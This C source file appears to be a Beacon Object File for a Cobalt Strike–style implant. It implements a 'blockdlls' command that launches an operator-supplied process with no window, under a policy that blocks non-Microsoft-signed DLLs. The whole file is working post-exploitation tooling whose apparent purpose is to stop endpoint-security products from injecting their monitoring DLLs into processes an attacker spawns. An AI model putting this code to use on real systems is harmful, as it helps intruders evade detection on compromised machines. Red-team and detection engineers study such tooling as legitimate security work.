#include <windows.h>
#include "beacon_compat.h"

#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY \
    ((DWORD_PTR)7 | 0x00020000)
#endif
#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON \
    ((DWORD64)1 << 44)
#endif
#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif

typedef BOOL (WINAPI *pInitAttrList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI *pUpdateAttr)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef void (WINAPI *pDeleteAttrList)(LPPROC_THREAD_ATTRIBUTE_LIST);

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    char *command = BeaconDataExtract(&parser, NULL);

    if (!command || !*command) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: blockdlls --command CMD\n");
        return;
    }

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    pInitAttrList pInit = (pInitAttrList)GetProcAddress(hK32, "InitializeProcThreadAttributeList");
    pUpdateAttr pUpdate = (pUpdateAttr)GetProcAddress(hK32, "UpdateProcThreadAttribute");
    pDeleteAttrList pDelete = (pDeleteAttrList)GetProcAddress(hK32, "DeleteProcThreadAttributeList");

    if (!pInit || !pUpdate || !pDelete) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ProcThreadAttributeList APIs not available\n");
        return;
    }

    SIZE_T attrSize = 0;
    pInit(NULL, 1, 0, &attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    if (!attrList || !pInit(attrList, 1, 0, &attrSize)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] InitializeProcThreadAttributeList failed\n");
        return;
    }

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    pUpdate(attrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
            &policy, sizeof(policy), NULL, NULL);

    STARTUPINFOEXW si;
    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attrList;

    wchar_t wCmd[4096] = {0};
    MultiByteToWideChar(CP_UTF8, 0, command, -1, wCmd, 4096);

    PROCESS_INFORMATION pi = {0};
    BOOL ok = CreateProcessW(NULL, wCmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, &si.StartupInfo, &pi);

    pDelete(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);

    if (ok) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Process created with blockdlls: PID %lu\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateProcessW failed: %lu\n", GetLastError());
    }
}
